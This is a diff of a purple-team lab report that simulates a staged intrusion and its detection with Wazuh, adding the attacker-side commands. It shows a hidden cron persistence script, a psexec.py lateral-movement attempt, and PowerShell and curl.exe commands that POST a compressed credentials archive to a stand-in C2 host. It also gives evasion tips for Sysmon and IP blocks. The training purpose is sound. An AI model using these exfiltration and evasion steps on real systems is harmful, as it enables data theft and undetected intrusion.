@@ -1,10 +1,20 @@
 # Advanced Threat Intelligence & Cyber Kill Chain Analysis (Operation Crimson Dawn - APT Simulation)
 
+## A Note on Methodology
+
+This report documents a full **purple team exercise**, meaning the analyst who authored this report also executed every stage of the simulated attack before switching roles to investigate and contain it. Each section is structured in two parts:
+
+- **Attack Execution**: what was done as the attacker, the exact commands run, and the outcome
+- **SOC Investigation**: how the same activity was detected, queried, and mapped as a defender
+
+This dual-role approach is deliberate. Understanding how an attack is built is what makes an analyst capable of detecting one.
+
 ## Executive Summary
-
-Between the reconnaissance phase and the final exfiltration attempt, a sophisticated threat actor group designated **Crimson Dawn** conducted a multi-stage intrusion against our organisation's network infrastructure. The attack progressed through six distinct phases, from initial network probing, through persistent backdoor installation on a public-facing web server, to a lateral movement attempt targeting an internal Windows workstation, and culminating in an attempt to exfiltrate a compressed archive of sensitive credentials.
-
-The most important finding is that our network's DMZ (the boundary zone between our internet-facing servers and the internal corporate network) failed to block the attacker's pivot. A server that should have been fully isolated was able to directly reach internal workstations, which means a breach of one internet-facing asset creates a direct path to our most sensitive internal systems.
+The analyst conducted a structured simulation of a multi-stage intrusion by a fictional hacktivist group designated **Crimson Dawn** whose stated objective was to steal sensitive intellectual property and leak it publicly to damage organisational reputation. Every phase of the attack was executed hands-on by the analyst, then immediately investigated using the **Wazuh SIEM platform**.
+ 
+The simulation confirmed that the organisation's network, as currently configured, would not survive this attack. A threat actor who successfully compromised the public-facing web server could move directly to internal workstations, stage sensitive credentials, and attempt exfiltration, all within a single session.
+ 
+**The single most important finding:** The DMZ (the isolated boundary zone between internet-facing servers and internal systems) failed to block the attacker's pivot. A server that should have been quarantined from the internal network had unrestricted SMB access to internal workstations. That gap alone converts a contained perimeter breach into a full internal network compromise.
 
 **Risk Rating:** 🔴 Critical
 
@@ -15,80 +25,43 @@ The most important finding is that our network's DMZ (the boundary zone between 
 
 Without these two investments, a real-world version of this attack would result in the public leak of corporate credentials, triggering regulatory penalties, client loss, and reputational damage that would take years to recover from.
 
-## Incident Overview
+---
 
-| Field | Detail |
-|---|---|
-| **Incident Name** | Operation Crimson Dawn |
-| **Threat Actor** | Crimson Dawn (Simulated Hacktivist Group) |
-| **Attack Objective** | Intellectual property theft and public data leak for reputational damage |
-| **Primary Target** | Internal Windows workstation (FABELT: 192.168.43.17) |
-| **Initial Entry Point** | DMZ Web Server (Prime-Ubuntu: 192.168.43.216) |
-| **Detection Platform** | Wazuh SIEM with Sysmon telemetry |
-| **Incident Status** | Contained: lateral movement blocked, exfiltration attempt failed |
-| **Environment** | **Simulated lab:** Wazuh Manager, Ubuntu Web Server, Windows endpoint |
+## Lab Architecture
+
+| Asset | Role | IP Address |
+|---|---|---|
+| **Wazuh Manager (Ubuntu)** | SIEM platform: collects and correlates all agent logs | None |
+| **Prime-Ubuntu (Web Server VM)** | Simulated compromised DMZ web server: attacker's initial foothold | `192.168.43.216` |
+| **FABELT (Windows Host)** | Internal Windows workstation - lateral movement target | `192.168.43.17` |
 
 ## Attack Timeline
 
-The following timeline reconstructs the complete attack chain as observed in Wazuh telemetry and system logs.
-
-```
-Phase 1 — Reconnaissance
-        │
-        ▼
-Crimson Dawn conducts network port scanning against the DMZ web server
-(Prime-Ubuntu at 192.168.43.216). SSH service on TCP port 22 identified.
-Multiple failed authentication attempts logged against both real and
-non-existent user accounts.
-        │
-        ▼
-Phase 2 — Exploitation & Persistence
-        │
-        ▼
-Attacker gains access to the web server.
-Malicious payload dropped to /tmp/.image.pdf.exe
-(hidden prefix + double extension for evasion).
-Payload registered as a root-level cron job — executes every minute,
-writing C2 heartbeat to /tmp/.hidden-log.
-Wazuh FIM captures both events (Rule 554 and Rule 550).
-        │
-        ▼
-Phase 3 — Lateral Movement Attempt
-        │
-        ▼
-From the compromised Prime-Ubuntu server, attacker executes psexec.py
-(Impacket) targeting Windows ADMIN$ share over TCP port 445 (SMB).
-Authentication fails — STATUS_LOGON_FAILURE (0xc000006d).
-Wazuh captures Windows Event ID 4625 (Logon Failure) on the FABELT endpoint.
-        │
-        ▼
-Phase 4 — Data Staging & Exfiltration Attempt
-        │
-        ▼
-On the Windows workstation, attacker creates C:\SensitiveFiles\passwords.txt.
-Directory compressed into exfil.tar.gz using native tar.exe.
-PowerShell Invoke-WebRequest attempts outbound HTTP transfer to 192.168.43.216.
-Connection dropped — no listener active on destination port.
-Secondary attempt via curl.exe — triggers Sysmon Event IDs 1 and 3.
-Wazuh captures command-line arguments, destination IP, and outbound connection.
-        │
-        ▼
-Phase 5 — Command & Control Channel
-        │
-        ▼
-C2 infrastructure centralised at 192.168.43.216 (Prime-Ubuntu server).
-Serves as both the automated backdoor heartbeat destination and
-the exfiltration endpoint. Custom Wazuh rule (ID 100001, Level 12)
-deployed to alert on any future communication with this IP.
-```
+![Attack Timeline Image]()
 
 ## Part 1 - Initial Breach: Reconnaissance and Delivery
 
-### What Happened
+### Attack Execution
 
-The attacker's first move was to identify active network services on our public-facing web server. Using network scanning techniques, they located the SSH service running on TCP port 22. They then executed a series of automated login attempts submitting invalid passwords against both existing user accounts and non-existent usernames, attempting to brute-force their way into the server.
+To simulate the attacker's initial access phase, the SSH service on the Prime-Ubuntu web server (`192.168.43.216`) was targeted with deliberate failed authentication attempts. The following command was run to generate reconnaissance and brute-force telemetry:
 
-***Investigation Action:***
+```bash
+ssh -v fatai@192.168.43.216
+```
+
+When prompted for a password, an incorrect password was intentionally supplied repeatedly. After several attempts the system returned:
+
+```
+Permission denied (publickey,password).
+```
+
+This simulated two distinct attacker behaviours: probing for active services on port 22 (reconnaissance), and submitting repeated invalid credentials (brute force). Both were performed against both a non-existent username and a real account with a wrong password, generating two distinct alert signatures in Wazuh.
+
+![Reconnaissance and Delivery]()
+
+---
+
+### SOC Investigation
 
 A Wazuh Dashboard query was created using the filter `rule.groups: "authentication_failed"` targeting the web server agent. This returned a clear record of repeated SSH authentication failures from a single source.
 
@@ -105,17 +78,56 @@ A Wazuh Dashboard query was created using the filter `rule.groups: "authenticati
 
 ## Part 2 - Establishing Foothold: Exploitation and Persistence
 
-### What Happened
+### Attack Execution
 
-Following initial access, the attacker staged a malicious payload on the compromised web server. The file `/tmp/.image.pdf.exe` was created, designed to look like an image file with a PDF extension, while the hidden prefix (`.`) and double extension (`.pdf.exe`) were deliberate evasion techniques to bypass manual administrative inspection.
+With simulated access to the Prime-Ubuntu web server established, the next phase was to drop a persistent backdoor. Two actions were performed on the web server VM:
 
-The payload was then registered in the system's **cron daemon** under the root user, configured to execute every minute. This script simulated a Command and Control (C2) heartbeat, writing a timestamp to `/tmp/.hidden-log` on each execution cycle. The cron job ensured the attacker's access survived server restarts and terminal disconnections.
+**Action 1 - Drop a hidden malicious payload:**
 
-### Investigation Action:
+A hidden file with a double extension was created in the `/tmp` directory. The hidden prefix (`.`) causes the file to be invisible to standard `ls` listings, and the double extension (`.pdf.exe`) was designed to make the file appear as a PDF document during casual manual inspection while remaining an executable binary.
 
-Wazuh's **File Integrity Monitoring (FIM)** module was queried using `rule.groups: "syscheck"`. Two critical events were returned from the Prime-Ubuntu endpoint.
+```bash
+touch /tmp/.image.pdf.exe
+chmod +x /tmp/.image.pdf.exe
+```
 
-![Wazuh File Integrity Monitoring results showing Rule 554 (file creation) for /tmp/.image.pdf.exe](images/part2_fim_alerts.png)
+The file was then written with a shell script simulating a C2 heartbeat, a recurring check-in to a command and control server:
+
+```bash
+echo '#!/bin/bash
+echo "C2 Checkin" >> /tmp/.hidden-log' > /tmp/.image.pdf.exe
+```
+
+**Action 2 - Register cron job for persistence:**
+
+The payload was then injected into the root user's cron table to execute automatically every minute:
+
+```bash
+crontab -e
+# Entry added:
+* * * * * /tmp/.image.pdf.exe
+```
+
+This ensures that even if the attacker's terminal session is closed, or the server is restarted, the backdoor continues to run while writing a timestamped heartbeat to `/tmp/.hidden-log` every 60 seconds. This is persistence.
+
+![Establishing Foothold: Exploitation and Persistence]()
+
+---
+
+### SOC Investigation
+
+**Query executed in Wazuh Dashboard:**
+
+```
+rule.groups: "syscheck"
+```
+
+Filtered to the Prime-Ubuntu endpoint. Two critical File Integrity Monitoring (FIM) events were returned:
+
+- **Rule 554 (File Added)**: Captured the creation of `/tmp/.image.pdf.exe`
+- **Rule 550 (File Modified)**: Captured repeated automated modifications to `/tmp/.hidden-log` driven by the cron-executed heartbeat script
+
+![Wazuh File Integrity Monitoring results showing Rule 554 and 550](images/part2_fim_alerts.png)
 
 > Figure 2: Wazuh FIM alerts from the Prime-Ubuntu web server. Rule 554 captured the creation of the hidden malicious payload `/tmp/.image.pdf.exe`. Rule 550 captured repeated automated modifications to `/tmp/.hidden-log`, driven by the cron-executed C2 heartbeat script.*
 
@@ -128,45 +140,111 @@ Wazuh's **File Integrity Monitoring (FIM)** module was queried using `rule.group
 
 ## Part 3 - Lateral Movement and Privilege Escalation Attempt
 
-### What Happened
+### Attack Execution
 
-Using the compromised web server as a **pivot point**, the attacker attempted to move deeper into the network, targeting the internal Windows workstation (FABELT at 192.168.43.17). The attack used **psexec.py** from the Impacket suite, which attempts to authenticate to the Windows `ADMIN$` administrative share over SMB (TCP port 445) and gain remote code execution.
+With a foothold established on the DMZ web server, the next objective was to pivot deeper into the network, targeting the internal Windows workstation (FABELT at `192.168.43.17`). From the compromised Prime-Ubuntu server, **psexec.py** from the Impacket suite was executed.
 
-The attempt **failed**, the target Windows system returned `STATUS_LOGON_FAILURE (0xc000006d)` due to invalid credentials. However, the attempt itself was captured in Wazuh telemetry as Windows Event ID 4625.
+The tool attempted to authenticate to the Windows `ADMIN$` administrative share over **TCP port 445 (SMB)** and deploy a service binary for remote code execution. The target Windows system rejected the attempt with an explicit SMB session error `SMB SessionError: STATUS_LOGON_FAILURE(0xc000006d)`
 
-**Critical finding:** Despite the authentication failure, this event proves the DMZ web server had unrestricted network-level access to internal workstations over SMB, a fundamental network segmentation failure.
+The authentication failure was due to invalid credentials. However, the network connection itself succeeded, proving that the DMZ server had unrestricted routing access to the internal Windows workstation over SMB. That routing path should not exist.
 
-### Investigation Action: 
+![Lateral Movement and Privilege Escalation Attempt]()
 
-A correlation query was executed in the Wazuh Dashboard: `(data.win.system.eventID: 4624 AND logon.process: "psexec") OR (data.win.system.eventID: 5140) OR (data.win.system.eventID: 4625)`. This returned the logon failure event with full forensic context.
+
+
+### SOC Investigation
+
+**Correlation query executed in Wazuh Dashboard:**
+
+```
+(data.win.system.eventID: 4624 AND logon.process: "psexec")
+OR (data.win.system.eventID: 5140)
+OR (data.win.system.eventID: 4625)
+```
+
+Filtered to the FABELT Windows endpoint. This returned the logon failure event with full forensic context.
 
 ![Wazuh Dashboard showing Windows Event ID 4625 Logon Failure alert on the FABELT endpoint](images/part3_lateral_movement.png)
 
 > Figure 3: Wazuh alert for Windows Event ID 4625 (Logon Failure) on the FABELT Windows endpoint. Key forensic artifacts: Source IP 192.168.43.216 (the compromised Prime-Ubuntu server), Target Account: Administrator, Logon Type 3 (network-based SMB connection). This confirms an unauthorized lateral movement attempt across the internal network boundary.*
 
----
+Forensic artifacts extracted from the event:
+
+| Artifact | Value | Significance |
+|---|---|---|
+| **Source IP** | `192.168.43.216` | Originating from the compromised Prime-Ubuntu DMZ server |
+| **Target Account** | `Administrator` | High-privilege account targeted |
+| **Logon Type** | `3` | Network-based connection: SMB, not a local interactive logon |
+| **Error Code** | `0xc000006d` | STATUS_LOGON_FAILURE: invalid credentials |
 
 ### MITRE ATT&CK Mapping
 
 | Technique ID | Name | Evidence |
 |---|---|---|
-| **T1021.002** | Remote Services: SMB/Windows Admin Shares | psexec.py targeting ADMIN$ share over TCP port 445, generating STATUS_LOGON_FAILURE and Windows Event ID 4625 |
+| **T1021.002** | Remote Services: SMB/Windows Admin Shares | `psexec.py` targeting `ADMIN$` over TCP 445 from `192.168.43.216`. Event ID 4625 captured on FABELT |
+
+---
 
 ## Part 4 - Data Staging and Exfiltration Attempt
 
-### What Happened
+### Attack Execution
 
-On the Windows workstation, the attacker created a target directory (`C:\SensitiveFiles\`) containing `passwords.txt`, simulating a targeted theft of sensitive corporate credentials. The directory was compressed into a gzip archive (`exfil.tar.gz`) using the native `tar.exe` binary, reducing the transfer size and bypassing file content monitoring tools that scan individual files.
+On the Windows host, the data theft sequence was executed in three steps:
 
-Two exfiltration attempts were made:
+**Step 1 - Create target data:**
 
-1. **PowerShell `Invoke-WebRequest`** attempted to POST the archive to the C2 server (192.168.43.216). The HTTP connection was dropped as no listener was active. Critically, this method *also evaded Sysmon process creation logging* because `Invoke-WebRequest` executes within the PowerShell engine without spawning a separate child process.
+```powershell
+mkdir C:\SensitiveFiles
+echo "admin:P@ssw0rd123, dbuser:S3cr3tDB!" > C:\SensitiveFiles\passwords.txt
+```
 
-2. **`curl.exe`** a secondary attempt using the external `curl.exe` binary. This successfully triggered Sysmon Event IDs 1 (process creation) and 3 (network connection), capturing both the command-line arguments and the destination C2 IP in Wazuh.
+**Step 2 - Compress and stage for exfiltration:**
 
-### Investigation Action:
+The native Windows `tar.exe` binary was used deliberately — it is a signed Microsoft binary, which means it evades application allowlist controls that block unsigned third-party tools:
 
-Wazuh was queried for `data.win.system.eventID: 1` (Sysmon process creation) targeting `tar.exe` and `curl.exe` command lines.
+```powershell
+tar.exe -czf C:\SensitiveFiles\exfil.tar.gz C:\SensitiveFiles\
+```
+
+Compressing the archive serves two purposes: it reduces the transfer size and bypasses file content monitoring tools that scan individual files by extension or signature.
+
+**Step 3 - Attempt exfiltration to C2 server:**
+
+**First attempt - PowerShell Invoke-WebRequest:**
+
+```powershell
+Invoke-WebRequest -Uri "http://192.168.43.216/upload" -Method POST -InFile C:\SensitiveFiles\exfil.tar.gz
+```
+
+The HTTP connection was dropped as no active listener was running on the destination port. The command returned a `WebException`. Critically, this method **also evaded Sysmon process creation logging** because `Invoke-WebRequest` executes internally within the PowerShell engine without spawning a child process.
+
+**Second attempt - curl.exe:**
+
+```powershell
+curl.exe -X POST -F "file=@C:\SensitiveFiles\exfil.tar.gz" http://192.168.43.216/upload
+```
+
+As an external binary, `curl.exe` spawns a distinct process, successfully generating Sysmon telemetry.
+
+![Data Staging and Exfiltration Attempt]()
+
+---
+
+### SOC Investigation
+
+**Query executed in Wazuh Dashboard:**
+
+```
+data.win.system.eventID: 1
+```
+
+Filtered to the FABELT Windows endpoint, targeting process creation events for `tar.exe` and `curl.exe`.
+
+Results confirmed:
+- **tar.exe** process creation with command-line arguments showing compression of `C:\SensitiveFiles\`
+- **curl.exe** process creation with command-line arguments exposing the destination C2 IP (`192.168.43.216`) and the archive being transferred
+
+Sysmon **Event ID 3** (network connection) was also captured, recording the outbound TCP connection from `curl.exe` to `192.168.43.216`.
 
 ![Wazuh Dashboard showing Sysmon Event ID 1 process creation alerts for tar.exe (data compression) and curl.exe (exfiltration attempt)](images/part4_exfiltration.png)
 
@@ -181,39 +259,44 @@ Wazuh was queried for `data.win.system.eventID: 1` (Sysmon process creation) tar
 
 ## Part 5 - Strategic Countermeasures and Threat Intelligence Integration
 
-### 5a: Custom Wazuh Detection Rule Deployment
+### 5a: Custom Wazuh Detection Rule
 
-A custom detection rule was created on the Wazuh Manager to generate a **Level 12 (High) alert** for any future communication with the known C2 IP address (192.168.43.216). This rule was added to `/var/ossec/etc/rules/local_rules.xml`.
+With the attacker's C2 IP confirmed as `192.168.43.216`, a custom detection rule was written on the Wazuh Manager to generate a **Level 12 (High Severity)** alert for any future communication with this address. The rule was added to `/var/ossec/etc/rules/local_rules.xml`
 
 ![Wazuh local_rules.xml modified with custom rule ID 100001 Level 12 targeting the known Crimson Dawn C2 IP address](images/part5a_custom_rule.png)
 
 > Figure 5: Wazuh Manager local rules file updated with custom rule ID 100001. Any future communication with the known C2 IP (192.168.43.216) will immediately trigger a Level 12 high-severity alert tagged to MITRE T1071.001 (Application Layer Protocol), enabling SOC analysts to detect C2 re-establishment instantly.*
 
-### 5b: Vulnerability Detection Scan Results
+### 5b: Vulnerability Detection Scan
 
-A proactive vulnerability scan was executed against the compromised web server (Prime-Ubuntu) using the Wazuh Vulnerability Detector module. The scan was filtered using `rule.groups: "vulnerability-detector"`.
+A proactive vulnerability scan was executed against the Prime-Ubuntu web server using the Wazuh Vulnerability Detector module. The scan was queried using:
 
-**Result:**
+```
+rule.groups: "vulnerability-detector"
+```
 
-Zero critical CVEs detected for the installed services. The host software was confirmed as fully patched.
+**Result:** Zero critical CVEs were detected for the installed services. The host was confirmed as fully patched.
 
-**Analyst Assessment:**
-
-The absence of known CVEs indicates Crimson Dawn likely gained initial access through one of three alternative vectors: a **zero-day exploit** against the web service, a successful **credential brute-force attack** via SSH (consistent with the Phase 1 findings), or exploitation of a **system misconfiguration** rather than an unpatched vulnerability. The brute-force evidence from Part 1 makes credential-based access the most probable initial access vector.
+**Analyst Assessment:** The absence of known CVEs indicates Crimson Dawn likely gained initial access via one of three alternative vectors: a zero-day exploit, successful SSH credential brute-forcing (consistent with the Phase 1 findings), or exploitation of a system misconfiguration. The brute-force telemetry from Part 1 makes credential-based access the most probable initial vector.
 
 ![Wazuh Vulnerability Detector scan results for the Prime-Ubuntu web server](images/part5b_vulnerability_scan.png)
 
 > Figure 6: Wazuh Vulnerability Detector results for the Prime-Ubuntu web server. Zero critical CVEs were returned for the installed service. This confirms the host was fully patched, and supports the assessment that initial access was gained through credential brute-forcing (consistent with Part 1 findings) rather than a known exploitable vulnerability.*
 
+
 ## Full Attack Narrative - Cyber Kill Chain Mapping
 
-| Kill Chain Stage | Adversary Action | MITRE ATT&CK |
-|---|---|---|
-| **Reconnaissance** | Crimson Dawn identified the DMZ web server (Prime-Ubuntu at 192.168.43.216). Conducted network port scanning to locate the active SSH service, then executed repeated brute-force authentication attempts using invalid and non-existent credentials. | T1595: Scanning IP Blocks AND T1110: Brute Force |
-| **Exploitation & Installation** | Attacker dropped `/tmp/.image.pdf.exe`, a hidden payload using a deceptive double extension. Registered in the root cron daemon to execute every minute, writing a C2 heartbeat to `/tmp/.hidden-log`. Wazuh FIM captured file creation (Rule 554) and modification (Rule 550). | T1036: Masquerading; T1053.003: Cron |
-| **Lateral Movement** | From the compromised Prime-Ubuntu server, attacker executed `psexec.py` targeting the Windows ADMIN$ share (TCP 445) as Administrator. Authentication failed (STATUS_LOGON_FAILURE). Wazuh captured Event ID 4625 on the FABELT endpoint, proving direct network routing from DMZ to internal workstation. | T1021.002: Remote Services (SMB/Windows Admin Shares) |
-| **Data Exfiltration** | On the Windows workstation, attacker created `C:\SensitiveFiles\passwords.txt`, compressed it with `tar.exe` into `exfil.tar.gz`, and attempted HTTP transfer to 192.168.43.216 via PowerShell `Invoke-WebRequest` and `curl.exe`. Sysmon captured process creation and outbound network connection events. | T1560.001: Archive via Utility; T1041: Exfiltration Over C2 Channel |
-| **Command & Control** | Centralised C2 infrastructure at 192.168.43.216 served as both the automated backdoor heartbeat endpoint and the exfiltration destination. Custom Wazuh rule deployed to alert on all future communications with this IP. | T1071.001: Application Layer Protocol |
+| Phase | Tactic | Technique ID | Technique Name | Evidence |
+|---|---|---|---|---|
+| 1 | Reconnaissance | T1595 | Active Scanning: Scanning IP Blocks | Network port scan identifying SSH on TCP 22 |
+| 1 | Credential Access | T1110 | Brute Force | Repeated SSH login failures against real and non-existent accounts |
+| 2 | Defense Evasion | T1036 | Masquerading | `/tmp/.image.pdf.exe` hidden prefix + double extension |
+| 2 | Persistence | T1053.003 | Scheduled Task/Job: Cron | Root cron job executing payload every minute |
+| 3 | Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | `psexec.py` targeting ADMIN$: Event ID 4625 captured |
+| 4 | Collection | T1560.001 | Archive Collected Data: Archive via Utility | `tar.exe` compressing `SensitiveFiles` into `exfil.tar.gz` |
+| 4 | Exfiltration | T1041 | Exfiltration Over C2 Channel | Outbound HTTP to 192.168.43.216 via PowerShell and curl.exe |
+| 5 | Command & Control | T1071.001 | Application Layer Protocol | HTTP-based C2 heartbeat and exfiltration channel |
+
 
 ## Business Impact Assessment
 
@@ -229,39 +312,46 @@ The absence of known CVEs indicates Crimson Dawn likely gained initial access th
 
 Four systemic failures enabled this attack chain to progress from initial reconnaissance to a near-successful data exfiltration:
 
-**1.  DMZ Network Segmentation Failure:** The compromised Prime-Ubuntu web server located in the DMZ was able to route SMB traffic (TCP 445) directly to the internal Windows workstation (FABELT). A properly segmented DMZ would have blocked this routing at the firewall layer. This is the most critical finding, it is the gap that converts a contained perimeter breach into a full internal network compromise.
+1. **DMZ Network Segmentation Failure:** The compromised Prime-Ubuntu web server located in the DMZ was able to route SMB traffic (TCP 445) directly to the internal Windows workstation (FABELT). A properly segmented DMZ would have blocked this routing at the firewall layer. This is the most critical finding, it is the gap that converts a contained perimeter breach into a full internal network compromise.
 
-**2.  Insufficient Outbound Egress Filtering:** The internal Windows workstation was permitted to establish unrestricted outbound HTTP connections to an untrusted external IP address. Internal workstations should not be able to initiate arbitrary outbound connections, a proxy or egress firewall configured with an allow-list of known destinations would have blocked the C2 exfiltration traffic entirely.
+2. **Insufficient Outbound Egress Filtering:** The internal Windows workstation was permitted to establish unrestricted outbound HTTP connections to an untrusted external IP address. Internal workstations should not be able to initiate arbitrary outbound connections, a proxy or egress firewall configured with an allow-list of known destinations would have blocked the C2 exfiltration traffic entirely.
 
-**3.  Exposed Management Interfaces:** The web server's SSH service (TCP 22) was accessible directly from the internet, enabling the attacker to execute remote brute-force authentication attempts at scale with no rate limiting or geographic restriction. Management ports should sit behind a VPN or Zero Trust gateway.
+3. **Exposed Management Interfaces:** The web server's SSH service (TCP 22) was accessible directly from the internet, enabling the attacker to execute remote brute-force authentication attempts at scale with no rate limiting or geographic restriction. Management ports should sit behind a VPN or Zero Trust gateway.
 
-**4.  Permissive Host Execution Policy:** The attacker successfully staged a malicious payload in the `/tmp` directory and established persistence via cron, indicating the endpoint lacked execution controls. Mounting `/tmp` with the `noexec` flag would have prevented script execution from that directory, eliminating the cron-based persistence vector entirely.
+4. **Permissive Host Execution Policy:** The attacker successfully staged a malicious payload in the `/tmp` directory and established persistence via cron, indicating the endpoint lacked execution controls. Mounting `/tmp` with the `noexec` flag would have prevented script execution from that directory, eliminating the cron-based persistence vector entirely.
 
 ## Strategic Recommendations
 
 The following four controls directly address each root cause identified above, ordered by implementation priority.
 
-- **Priority 1: Enforce Network Segmentation (Immediate):** Implement strict firewall Access Control Lists (ACLs) between the DMZ and the internal corporate network. Specifically, **block SMB (TCP 445), RDP (TCP 3389), and all administrative protocols** from originating in the DMZ and reaching internal workstations. This single control would have stopped the lateral movement phase entirely.
+1. **Enforce Network Segmentation (Immediate):** Implement strict firewall Access Control Lists (ACLs) between the DMZ and the internal corporate network. Specifically, **block SMB (TCP 445), RDP (TCP 3389), and all administrative protocols** from originating in the DMZ and reaching internal workstations. This single control would have stopped the lateral movement phase entirely.
 
-> **Business Justification:** Enforcing DMZ network segmentation eliminates the direct path from a perimeter breach to internal systems, reducing the blast radius of any future web server compromise from "entire internal network" to "one isolated server."
+>**Business Justification:** Enforcing DMZ network segmentation eliminates the direct path from a perimeter breach to internal systems, reducing the blast radius of any future web server compromise from "entire internal network" to "one isolated server."
 
-- **Priority 2: Deploy Endpoint Detection and Response (Immediate):** Upgrade endpoint security from traditional antivirus to an active EDR solution across all servers and workstations. EDR provides real-time behavioural monitoring and blocking, it would have detected and stopped the cron job persistence attempt, the `psexec.py` execution, and the `tar.exe` data staging in real time, before any data left the host.
+2. **Deploy Endpoint Detection and Response (Immediate):** Upgrade endpoint security from traditional antivirus to an active EDR solution across all servers and workstations. EDR provides real-time behavioural monitoring and blocking, it would have detected and stopped the cron job persistence attempt, the `psexec.py` execution, and the `tar.exe` data staging in real time, before any data left the host.
 
 > **Business Justification:** Deploying EDR mitigates the risk of catastrophic data theft by neutralising internal threats that bypass our perimeter defences, protecting intellectual property and avoiding the regulatory fines that follow a confirmed data breach.
 
+3. **Implement Outbound Egress Filtering (Short-term):** Deploy a Secure Web Gateway or egress firewall to restrict outbound internet access from internal workstations. Endpoints should only be permitted to communicate with known, categorised destinations, this would have blocked the `curl.exe` and `Invoke-WebRequest` C2 exfiltration attempts at the network layer.
 
-- **Priority 3: Implement Outbound Egress Filtering (Short-term):** Deploy a Secure Web Gateway or egress firewall to restrict outbound internet access from internal workstations. Endpoints should only be permitted to communicate with known, categorised destinations, this would have blocked the `curl.exe` and `Invoke-WebRequest` C2 exfiltration attempts at the network layer.
-
-- **Priority 4: Secure Management Interfaces via Zero Trust (Short-term):** Remove direct public internet access to administrative services (SSH, RDP) on all DMZ servers. Require administrators to authenticate through a corporate VPN or Zero Trust Network Access (ZTNA) gateway before managing internet-facing infrastructure. This eliminates the brute-force attack surface entirely.
+4. **Secure Management Interfaces via Zero Trust (Short-term):** Remove direct public internet access to administrative services (SSH, RDP) on all DMZ servers. Require administrators to authenticate through a corporate VPN or Zero Trust Network Access (ZTNA) gateway before managing internet-facing infrastructure. This eliminates the brute-force attack surface entirely.
 
 ## Strategic Analysis
 
-- **Alternative Persistence Technique (If Admin Rights Were Gained on Windows):** Had Crimson Dawn successfully authenticated to the Windows workstation with administrative privileges, the most impactful persistence mechanism they could have deployed is **T1543.003 - Create or Modify System Process: Windows Service**. A malicious Windows service configured to start automatically on boot would execute the payload as the highly privileged `SYSTEM` account, persisting across all reboots before any user logs in, and running with permissions that bypass most user-context security controls. This is a significant escalation from cron-based persistence and would require forensic-level investigation to detect and remediate.
+### If the Attacker Had Gained Windows Admin Rights
 
-- **How Proactive Vulnerability Detection Could Have Prevented the Breach:** Had the Wazuh Vulnerability Detector been actively monitored prior to this incident, the SOC team would have received alerts on any high-severity CVEs affecting the DMZ web server's installed services, flagging the vulnerable attack surface before Crimson Dawn could exploit it. This shifts the security posture from reactive (detect after breach) to proactive (patch before exploitation), eliminating the attack vector at its source.
+- Had `psexec.py` succeeded, the most impactful persistence technique available would have been `T1543.003 - Create or Modify System Process: Windows Service`. A malicious Windows service configured to start automatically on boot executes as the `SYSTEM` account, the most privileged context available on a Windows machine, before any user logs in. Unlike cron-based persistence, a malicious service is significantly harder to detect and remove, and runs at a privilege level that bypasses most user-context security controls.
 
-- **Bypassing the Custom IP-Block Rule - Attacker's Counter-Move:** The custom Wazuh rule (Rule 100001) blocks communication with the known C2 IP address `192.168.43.216`. An experienced attacker would bypass this within minutes by switching to **domain-based C2** rather than a hardcoded IP. The attacker registers a domain (e.g., `update-server.com`) and points it to their C2 IP. If that IP gets blocked, they update the domain's DNS `A` record to point to a new, unblocked IP address, sometimes within seconds, using a technique called **Fast Flux DNS**. The blocked rule becomes irrelevant because the malware calls the domain, not the IP directly.
-> **Defensive counter-measure:** IP-based blocking must be paired with **DNS-based threat intelligence filtering** (blocking malicious domains at the resolver level) and **SSL inspection** to catch domain-fronting evasion techniques.
+### How Proactive Vulnerability Detection Could Have Prevented the Breach
+
+- Had the Wazuh Vulnerability Detector been actively monitored prior to this incident, high-severity CVE alerts on the DMZ web server's installed services would have flagged the vulnerable attack surface before exploitation occurred. This shifts the security posture from reactive (detect the breach) to proactive (patch before the breach), eliminating the attack vector at its source rather than responding to it after the fact.
+
+### How an Attacker Bypasses a C2 IP Block
+ 
+- The custom Wazuh rule (Rule 100001) blocks communication with the known C2 IP `192.168.43.216`. An experienced attacker bypasses this by switching from a hardcoded IP to a **domain name** (e.g., `update-server.com`). If the IP gets blocked, the attacker updates the domain's DNS `A` record to point to a new, unblocked IP sometimes within seconds, using **Fast Flux DNS**. The blocked rule becomes irrelevant because the malware calls the domain, not the IP.
+ 
+- **Defensive counter-measure:** IP-based blocking must be paired with DNS-based threat intelligence filtering and SSL inspection to catch domain-fronting evasion techniques.
+
 
 ## Challenges Encountered and Resolutions
 
@@ -305,18 +395,5 @@ The following four controls directly address each root cause identified above, o
 | **Lateral Movement Tool** | `psexec.py` (Impacket) | SMB/Windows Admin Shares |
 | **SMB Target Share** | `ADMIN$` on 192.168.43.17 | Lateral movement target |
 | **Wazuh Rule Deployed** | Rule ID 100001, Level 12 | Custom C2 IP detection rule |
-
-## Appendix: MITRE ATT&CK Full Matrix
-
-| Phase | Tactic | Technique ID | Technique Name | Evidence |
-|---|---|---|---|---|
-| 1 | Reconnaissance | T1595 | Active Scanning: Scanning IP Blocks | Network port scan identifying SSH on TCP 22 |
-| 1 | Credential Access | T1110 | Brute Force | Repeated SSH login failures against real and non-existent accounts |
-| 2 | Defense Evasion | T1036 | Masquerading | `/tmp/.image.pdf.exe` hidden prefix + double extension |
-| 2 | Persistence | T1053.003 | Scheduled Task/Job: Cron | Root cron job executing payload every minute |
-| 3 | Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | `psexec.py` targeting ADMIN$: Event ID 4625 captured |
-| 4 | Collection | T1560.001 | Archive Collected Data: Archive via Utility | `tar.exe` compressing `SensitiveFiles` into `exfil.tar.gz` |
-| 4 | Exfiltration | T1041 | Exfiltration Over C2 Channel | Outbound HTTP to 192.168.43.216 via PowerShell and curl.exe |
-| 5 | Command & Control | T1071.001 | Application Layer Protocol | HTTP-based C2 heartbeat and exfiltration channel |
 
 > **Disclaimer:** This report documents a structured threat simulation conducted within an isolated lab environment as part of a cybersecurity training exercise. No production systems were accessed. All attacker actions, IP addresses, and file artifacts described in this report are simulated. This document is published for educational and portfolio purposes only.
